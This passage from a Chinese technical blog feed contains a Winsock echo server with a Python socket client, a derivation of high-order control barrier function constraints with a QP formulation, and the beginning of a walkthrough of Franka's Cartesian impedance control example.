class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">this</span>-&gt;buffer_), <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;<span class="hljs-keyword">this</span>-&gt;client_addr_, &amp;<span class="hljs-keyword">this</span>-&gt;client_addr_len_) &lt; <span class="hljs-number">0</span>) &#123;<br>            std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to receive message&quot;</span> &lt;&lt; std::endl;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">this</span>-&gt;buffer_size_ = <span class="hljs-built_in">strlen</span>(<span class="hljs-keyword">this</span>-&gt;buffer_);<br>    <span class="hljs-keyword">return</span> buffer_size_;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">Server::GetBuffer</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;buffer_;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Server::Close</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">closesocket</span>(<span class="hljs-keyword">this</span>-&gt;client_fd_);<br>    <span class="hljs-built_in">closesocket</span>(<span class="hljs-keyword">this</span>-&gt;server_fd_);<br>    <span class="hljs-built_in">WSACleanup</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="main.cpp">main.cpp</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winsock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;server.h&quot;</span></span><br><br><span class="hljs-type">int</span> protocol = <span class="hljs-number">1</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Lowercase2Uppercase</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; str[i] != <span class="hljs-string">&#x27;\0&#x27;</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (str[i] &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; str[i] &lt;= <span class="hljs-string">&#x27;z&#x27;</span>) &#123;<br>            str[i] -= <span class="hljs-number">32</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-function">Server <span class="hljs-title">server</span><span class="hljs-params">(<span class="hljs-number">8080</span>, protocol)</span></span>;<br>    server.<span class="hljs-built_in">Start</span>();<br>    <span class="hljs-type">int</span> msg_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>        <span class="hljs-keyword">if</span>(protocol == <span class="hljs-number">0</span>)&#123;<br>            server.<span class="hljs-built_in">Accept</span>();<br>        &#125;<br>        msg_size = server.<span class="hljs-built_in">Receive</span>();<br>        <span class="hljs-keyword">if</span>(msg_size)&#123;<br>            <span class="hljs-keyword">if</span>(server.<span class="hljs-built_in">GetBuffer</span>()[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;q&#x27;</span> &amp;&amp; server.<span class="hljs-built_in">GetBuffer</span>()[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)&#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;Client: &quot;</span> &lt;&lt; server.<span class="hljs-built_in">GetBuffer</span>() &lt;&lt; std::endl;<br>            <span class="hljs-built_in">Lowercase2Uppercase</span>(server.<span class="hljs-built_in">GetBuffer</span>());<br>            server.<span class="hljs-built_in">Send</span>(server.<span class="hljs-built_in">GetBuffer</span>());<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;Server: &quot;</span> &lt;&lt; server.<span class="hljs-built_in">GetBuffer</span>() &lt;&lt; std::endl;<br>        &#125;<br>    &#125;<br>    server.<span class="hljs-built_in">Close</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>we should also add the ws2_32.lib in the CMakeLists.txt file.</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">target_link_libraries</span>(net_socket ws2_32)<br></code></pre></td></tr></table></figure><h4 id="client.py">client.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment"># protocol = socket.SOCK_STREAM # TCP</span><br>protocol = socket.SOCK_DGRAM <span class="hljs-comment"># UDP</span><br>server = <span class="hljs-string">&#x27;10.136.12.124&#x27;</span><span class="hljs-comment"># 10.136.12.124</span><br>port = <span class="hljs-number">8080</span><br><br>s = socket.socket(socket.AF_INET, protocol)<br><span class="hljs-keyword">if</span> protocol == socket.SOCK_STREAM:<br>    s.connect((server, port))<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter your message: &#x27;</span>)<br>    <span class="hljs-keyword">if</span> protocol == socket.SOCK_DGRAM:<br>        s.sendto(message.encode(), (server, port))<br>        <span class="hljs-keyword">if</span> message == <span class="hljs-string">&#x27;q&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br>        response, addr = s.recvfrom(<span class="hljs-number">1024</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;server: &#x27;</span>+response.decode())<br>        <span class="hljs-keyword">continue</span><br>    s.send(message.encode())<br>    <span class="hljs-keyword">if</span> message == <span class="hljs-string">&#x27;q&#x27;</span>:<br>        <span class="hljs-keyword">break</span><br>    response = s.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;server: &#x27;</span>+response.decode())<br><br>s.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>high order control barrier functions with time varying output constraints</title>
    <link href="/2024/09/28/high-order-control-barrier-functions-with-time-varying-output-constraints/"/>
    <url>/2024/09/28/high-order-control-barrier-functions-with-time-varying-output-constraints/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>记录一下拖了一周的HOCBF设计过程。</p><h2 id="问题描述">问题描述</h2><p>给定一个非线性系统：<br /><span class="math display">\[\dot{x} = f(x) + g(x)u\]</span></p><p>其中<spanclass="math inline">\(x\in\mathbb{R}^n\)</span>是系统状态，<spanclass="math inline">\(u\in\mathbb{R}^m\)</span>是控制输入，<spanclass="math inline">\(f(x)\)</span>和<spanclass="math inline">\(g(x)\)</span>是已知的连续函数。</p><p>CBF：<br /><span class="math display">\[h(x) \geq 0\]</span> 其约束为：<br /><span class="math display">\[L_fh(x) + L_gh(x)u \geq -\alpha(h(x))\]</span></p><p>其中<span class="math inline">\(h(x)\)</span>是已知的连续函数。</p><p>设h(t,x)是时间t的函数，其相关度为<spanclass="math inline">\(\lambda\)</span>，则HOCBF约束为：<br /><span class="math display">\[L_f^{\lambda}h(t,x) + L_gL_f^{\lambda-1}h(t,x)u +\frac{\partial^{\lambda} h(t,x)}{\partial t^{\lambda}} \geq-K_{\alpha}(\mu(t,x))\]</span> 其中：<br /><span class="math display">\[K_{\alpha} = \left[\begin{matrix} \alpha_0 &amp; \alpha_1 &amp; \cdots&amp; \alpha_{\lambda-1} \end{matrix} \right]\]</span> <span class="math display">\[\mu(t,x) = \left[\begin{matrix} h(t,x) &amp; L_fh(t,x)+\frac{\partialh(t,x)}{\partial t} &amp; \cdots &amp; L_f^{\lambda-1}h(t,x)+\frac{\partial^{\lambda-1} h(t,x)}{\partial t^{\lambda-1}} \end{matrix}\right]^T\]</span></p><p>确定<spanclass="math inline">\(\alpha_i\)</span>的值，使得HOCBF约束成立。</p><p><span class="math inline">\(\alpha_i\)</span>应满足：<br /><span class="math display">\[s^{\lambda} + \alpha_{\lambda-1}s^{\lambda-1} + \cdots + \alpha_1s +\alpha_0\]</span> <span class="math display">\[\gamma_i &lt; 0\]</span> 其中<spanclass="math inline">\(\gamma_i\)</span>是系统的特征值。</p><h2 id="设计过程">设计过程</h2><p>以三维空间的障碍物避障为例，系统状态为：<br /><span class="math display">\[x = \left[\begin{matrix} x &amp; y &amp; z \end{matrix}\right]^T\]</span> 仿射系统：<br /><span class="math display">\[\dot{x} = f(x) + g(x)u\]</span> 障碍物位置：<br /><span class="math display">\[p_{obs} = \left[\begin{matrix} x_{obs} &amp; y_{obs} &amp; z_{obs}\end{matrix}\right]^T\]</span> 定义CBF：<br /><span class="math display">\[h(x) = (x-x_{obs})^T(x-x_{obs}) - r^2\]</span> 其中r是障碍物半径。</p><p>设相关度<spanclass="math inline">\(\lambda=2\)</span>，则HOCBF约束为：<br /><span class="math display">\[L_f^{2}h(t,x) + L_gL_fh(t,x)u + \frac{\partial^{2} h(t,x)}{\partialt^{2}} \geq -K_{\alpha}(\mu(t,x))\]</span> 其中：<br /><span class="math display">\[K_{\alpha} = \left[\begin{matrix} \alpha_0 &amp; \alpha_1 \end{matrix}\right]\]</span> <span class="math display">\[\mu(t,x) = \left[\begin{matrix} h(t,x) &amp; L_fh(t,x)+\frac{\partialh(t,x)}{\partial t} \end{matrix} \right]^T\]</span></p><p>分别计算<span class="math inline">\(L_f^{2}h(t,x), L_gL_fh(t,x),\frac{\partial^{2} h(t,x)}{\partial t^{2}}\)</span>：<br /><span class="math display">\[L_fh(t,x) = \nabla h(x) \cdot f(x) = 2(x-x_{obs}) \cdot f(x)\]</span> <span class="math display">\[L_f^{2}h(t,x) = \nabla L_fh(x) \cdot f(x) = 2f(x) \cdot f(x) +2(x-x_{obs}) \cdot \nabla f(x) \cdot f(x)\]</span> <span class="math display">\[L_gL_fh(t,x) = \nabla L_fh(x) \cdot g(x) = 2f(x) \cdot g(x) +2(x-x_{obs}) \cdot \nabla f(x) \cdot g(x)\]</span> <span class="math display">\[\frac{\partial h(t,x)}{\partial t} = 2(x-x_{obs}) \cdot \dot{x}\]</span> <span class="math display">\[\frac{\partial^{2} h(t,x)}{\partial t^{2}} = 2(\dot{x} \cdot \dot{x} +(x-x_{obs}) \cdot \ddot{x})\]</span> 此处<span class="math inline">\(\cdot\)</span>都是点乘。</p><p>代入HOCBF约束中，得到：<br /><span class="math display">\[2f(x) \cdot f(x) + 2(x-x_{obs}) \cdot \nabla f(x) \cdot f(x) + 2f(x)\cdot g(x) + 2(x-x_{obs}) \cdot \nabla f(x) \cdot g(x) \cdot u +2(\dot{x} \cdot \dot{x} + (x-x_{obs}) \cdot \ddot{x}) \geq-K_{\alpha}(\mu(t,x))\]</span></p><h2 id="qp问题">QP问题</h2><p>标准QP问题：<br /><span class="math display">\[x = argmin \frac{1}{2}x^THx + F^Tx\]</span> <span class="math display">\[s.t. Ax \geq b\]</span> 将HOCBF约束转化为QP问题：<br /><span class="math display">\[u = argmin \frac{1}{2} ||u - u_{ref}||^2\]</span> <span class="math display">\[s.t. L_f^{2}h(t,x) + L_gL_fh(t,x)u + \frac{\partial^{2} h(t,x)}{\partialt^{2}} \geq -K_{\alpha}(\mu(t,x))\]</span> 其中<spanclass="math inline">\(u_{ref}\)</span>是控制输入的参考值。<br />对于正定矩阵H和常数项F，由于：<br /><span class="math display">\[||u - u_{ref}||^2 = (u - u_{ref})^T(u - u_{ref}) = u^Tu - 2u^Tu_{ref} +u_{ref}^Tu_{ref}\]</span> 忽略常数项，得到：<br /><span class="math display">\[H = I\]</span> <span class="math display">\[F = -2u_{ref}\]</span></p><p>再对QP进行求解，得到控制输入u。</p>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>franka cartesian impedance control example</title>
    <link href="/2024/09/18/franka-cartesian-impedance-control-example/"/>
    <url>/2024/09/18/franka-cartesian-impedance-control-example/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="代码">1.代码</h1><p>franka官方给出的笛卡尔空间下的阻抗控制例程。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Copyright (c) 2023 Franka Robotics GmbH</span><br><span class="hljs-comment">// Use of this source code is governed by the Apache-2.0 license, see LICENSE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;array&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;functional&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Eigen/Dense&gt;</span></span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;franka/duration.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;franka/exception.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;franka/model.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;franka/robot.h&gt;</span></span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;examples_common.h&quot;</span></span><br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> </span>&#123;<br>  <span class="hljs-comment">// Check whether the required arguments were passed</span><br>  <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>    std::cerr &lt;&lt; <span class="hljs-string">&quot;Usage: &quot;</span> &lt;&lt; argv[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-string">&quot; &lt;robot-hostname&gt;&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br> <br>  <span class="hljs-comment">// Compliance parameters</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">double</span> translational_stiffness&#123;<span class="hljs-number">150.0</span>&#125;;<br>  <span class="hljs-type">const</span> <span class="hljs-type">double</span> rotational_stiffness&#123;<span class="hljs-number">10.0</span>&#125;;<br>  <span class="hljs-function">Eigen::MatrixXd <span class="hljs-title">stiffness</span><span class="hljs-params">(<span class="hljs-number">6</span>, <span class="hljs-number">6</span>)</span>, <span class="hljs-title">damping</span><span class="hljs-params">(<span class="hljs-number">6</span>, <span class="hljs-number">6</span>)</span></span>;<br>  stiffness.<span class="hljs-built_in">setZero</span>();<br>  stiffness.<span class="hljs-built_in">topLeftCorner</span>(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>) &lt;&lt; translational_stiffness * Eigen::MatrixXd::<span class="hljs-built_in">Identity</span>(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br>  stiffness.<span class="hljs-built_in">bottomRightCorner</span>(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>) &lt;&lt; rotational_stiffness * Eigen::MatrixXd::<span class="hljs-built_in">Identity</span>(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br>  damping.<span class="hljs-built_in">setZero</span>();<br>  damping.<span class="hljs-built_in">topLeftCorner</span>(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">2.0</span> * <span class="hljs-built_in">sqrt</span>(translational_stiffness) *<br>                                     Eigen::MatrixXd::<span class="hljs-built_in">Identity</span>(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br>  damping.<span class="hljs-built_in">bottomRightCorner</span>(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">2.0</span> * <span class="hljs-built_in">sqrt</span>(rotational_stiffness) *<br>                                         Eigen::MatrixXd::<span class="hljs-built_in">Identity</span>(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br> <br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// connect to robot</span><br>    <span class="hljs-function">franka::Robot <span class="hljs-title">robot</span><span class="hljs-params">(argv[<span class="hljs-number">1</span>])</span></span>;<br>    <span class="hljs-built_in">setDefaultBehavior</span>(robot);<br>    <span class="hljs-comment">// load the kinematics and dynamics model</span><br>    franka::Model model = robot.<span class="hljs-built_in">loadModel</span>();<br> <br>    franka::RobotState initial_state = robot.<span class="hljs-built_in">readOnce</span>();<br> <br>    <span class="hljs-comment">// equilibrium point is the initial position</span><br>    <span class="hljs-function">Eigen::Affine3d <span class="hljs-title">initial_transform</span><span class="hljs-params">(Eigen::Matrix4d::Map(initial_state.O_T_EE.data()))</span></span>;<br>    <span class="hljs-function">Eigen::Vector3d <span class="hljs-title">position_d</span><span class="hljs-params">(initial_transform.translation())</span></span>;<br>    <span class="hljs-function">Eigen::Quaterniond <span class="hljs-title">orientation_d</span><span class="hljs-params">(initial_transform.rotation())</span></span>;<br> <br>    <span class="hljs-comment">// set collision behavior</span><br>    robot.<span class="hljs-built_in">setCollisionBehavior</span>(&#123;&#123;<span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>&#125;&#125;,<br>                               &#123;&#123;<span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>&#125;&#125;,<br>                               &#123;&#123;<span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>&#125;&#125;,<br>                               &#123;&#123;<span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">100.0</span>&#125;&#125;);<br> <br>    <span class="hljs-comment">// define callback for the torque control loop</span><br>    std::function&lt;franka::Torques(<span class="hljs-type">const</span> franka::RobotState&amp;, franka::Duration)&gt;<br>        impedance_control_callback = [&amp;](<span class="hljs-type">const</span> franka::RobotState&amp; robot_state,<br>                                         franka::Duration <span class="hljs-comment">/*duration*/</span>) -&gt; franka::Torques &#123;<br>      <span class="hljs-comment">// get state variables</span><br>      std::array&lt;<span class="hljs-type">double</span>, <span class="hljs-number">7</span>&gt; coriolis_array = model.<span class="hljs-built_in">coriolis</span>(robot_state);<br>      std::array&lt;<span class="hljs-type">double</span>, 42&gt; jacobian_array =<br>          model.<span class="hljs-built_in">zeroJacobian</span>(franka::Frame::kEndEffector, robot_state);<br> <br>      <span class="hljs-comment">// convert to Eigen</span><br>      Eigen::Map&lt;<span class="hljs-type">const</span> Eigen::Matrix&lt;<span class="hljs-type">double</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>&gt;&gt; <span class="hljs-built_in">coriolis</span>(coriolis_array.<span class="hljs-built_in">data</span>());<br>      Eigen::Map&lt;<span class="hljs-type">const</span> Eigen::Matrix&lt;<span class="hljs-type">double</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>&gt;&gt; <span class="hljs-built_in">jacobian</span>(jacobian_array.<span class="hljs-built_in">data</span>());<br>      Eigen::Map&lt;<span class="hljs-type">const</span> Eigen::Matrix&lt;<span class="hljs-type">double</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>&gt;&gt; <span class="hljs-built_in">q</span>(robot_state.q.<span class="hljs-built_in">data</span>());<br>      Eigen::Map&lt;<span class="hljs-type">const</span> Eigen::Matrix&lt;<span class="hljs-type">double</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>&gt;&gt; <span class="hljs-built_in">dq</span>(robot_state.dq.<span class="hljs-built_in">data</span>());<br>      <span class="hljs-function">Eigen::Affine3d <span class="hljs-title">transform</span><span class="hljs-params">(Eigen::Matrix4d::Map(robot_state.O_T_EE.data()))</span></span>;<br>      <span class="hljs-function">Eigen::Vector3d <span class="hljs-title">position</span><span class="hljs-params">(transform.translation())</span></span>;<br>      <span class="hljs-function">Eigen::Quaterniond <span class="hljs-title">orientation</span><span class="hljs-params">(transform.rotation())</span></span>;<br> <br>      <span class="hljs-comment">// compute error to desired equilibrium pose</span><br>      <span class="hljs-comment">// position error</span><br>      Eigen::Matrix&lt;<span class="hljs-type">double</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>&gt; error;<br>      error.<span class="hljs-built_in">head</span>(<span class="hljs-number">3</span>) &lt;&lt; position - position_d;<br> <br>      <span class="hljs-comment">// orientation error</span><br>      <span class="hljs-comment">// &quot;difference&quot; quaternion</span><br>      <span class="hljs-keyword">if</span> (orientation_d.<span class="hljs-built_in">coeffs</span>().<span class="hljs-built_in">dot</span>(orientation.<span class="hljs-built_in">coeffs</span>()) &lt; <span class="hljs-number">0.0</span>) &#123;<br>        orientation.<span class="hljs-built_in">coeffs</span>() &lt;&lt; -orientation.<span class="hljs-built_in">coeffs</span>();<br>      &#125;<br>      <span class="hljs-comment">// &quot;difference&quot; quaternion</span><br>      <span class="hljs-function">Eigen::Quaterniond <span class="hljs-title">error_quaternion</span><span class="hljs-params">(orientation.inverse() * orientation_d)</span></span>;<br>      error.<span class="hljs-built_in">tail</span>(<span class="hljs-number">3</span>) &lt;&lt; error_quaternion.<span class="hljs-built_in">x</span>(), error_quaternion.<span class="hljs-built_in">y</span>(), error_quaternion.<span class="hljs-built_in">z</span>();<br>      <span class="hljs-comment">// Transform to base frame</span><br>      error.<span class="hljs-built_in">tail</span>(<span class="hljs-number">3</span>) &lt;&lt; -transform.<span class="hljs-built_in">rotation</span>() * error.<span class="hljs-built_in">tail</span>(<span class="hljs-number">3</span>);<br> <br>      <span class="hljs-comment">// compute control</span><br>      <span class="hljs-function">Eigen::VectorXd <span class="hljs-title">tau_task</span><span class="hljs-params">(<span class="hljs-number">7</span>)</span>, <span class="hljs-title">tau_d</span><span class="hljs-params">(<span class="hljs-number">7</span>)</span></span>;<br> <br>      <span class="hljs-comment">// Spring damper system with damping ratio=1</span><br>      tau_task &lt;&lt; jacobian.<span class="hljs-built_in">transpose</span>() * (-stiffness * error - damping * (jacobian * dq));<br>      tau_d &lt;&lt; tau_task + coriolis;<br> <br>      std::array&lt;<span class="hljs-type">double</span>, 7&gt; tau_d_array&#123;&#125;;<br>      Eigen::VectorXd::<span class="hljs-built_in">Map</span>(&amp;tau_d_array[<span class="hljs-number">0</span>], <span class="hljs-number">7</span>) = tau_d;<br>      <span class="hljs-keyword">return</span> tau_d_array;<br>    &#125;;<br> <br>    <span class="hljs-comment">// start real-time control loop</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;WARNING: Collision thresholds are set to high values. &quot;</span><br>              &lt;&lt; <span class="hljs-string">&quot;Make sure you have the user stop at hand!&quot;</span> &lt;&lt; std::endl<br>              &lt;&lt; <span class="hljs-string">&quot;After starting try to push the robot and see how it reacts.&quot;</span> &lt;&lt; std::endl<br>              &lt;&lt; <span class="hljs-string">&quot;Press Enter to continue...&quot;</span> &lt;&lt; std::endl;<br>    std::cin.<span class="hljs-built_in">ignore</span>();<br>    robot.<span class="hljs-built_in">control</span>(impedance_control_callback);<br> <br>  &#125; <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> franka::Exception&amp; ex) &#123;<br>    <span class="hljs-comment">// print exception</span><br>    std::cout &lt;&lt; ex.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;<br>  &#125;<br> <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="说明">2.说明</h1><p>记录一下关键代码的部分。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">franka::Robot <span class="hljs-title">robot</span><span class="hljs-params">(argv[<span class="hljs-number">1</span>])</span></span>;<br><span class="hljs-built_in">setDefaultBehavior</span>(robot);<br><span class="hljs-comment">// load the kinematics and dynamics model</span><br>franka::Model model = robot.<span class="hljs-built_in">loadModel</span>();<br><br>franka::RobotState initial_state = robot.<span class="hljs-built_in">readOnce</span>();<br></code></pre></td></tr></table></figure><p>使用<code>franka::Robot</code>类初始化机械臂，设置默认行为，加载机械臂的运动学和动力学模型，读取机械臂的初始状态。<br />官方文档给的ip是172.16.0.2。<br />这里有个坑是，如果用apt安装libfranka和franka_ros库的话，examples_common.h头文件会找不到，需要在libfranka的GitHub仓库手动下载examples_common.h和对应的cpp文件，放到工程目录下。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 